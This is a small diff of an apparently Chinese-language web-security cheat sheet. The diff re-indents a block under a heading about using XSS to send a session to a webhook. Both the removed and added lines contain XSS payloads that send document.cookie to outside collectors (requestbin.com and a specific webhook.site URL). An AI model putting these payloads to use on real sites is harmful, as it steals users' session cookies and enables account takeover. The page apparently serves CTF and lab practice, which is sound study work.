@@ -47,13 +47,13 @@ fetch(`/getflag\)
 ```
 
 * 利用XSS把session打到webhook上
-{% raw %}    
-```javascript?
-window.location=<requestbin.com>/?a+document.cookie
-// or
-fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
-```
-{% endraw %}
+    {% raw %}    
+    ```javascript?
+    window.location=<requestbin.com>/?a+document.cookie
+    // or
+    fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
+    ```
+    {% endraw %}
 
 #### [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
 
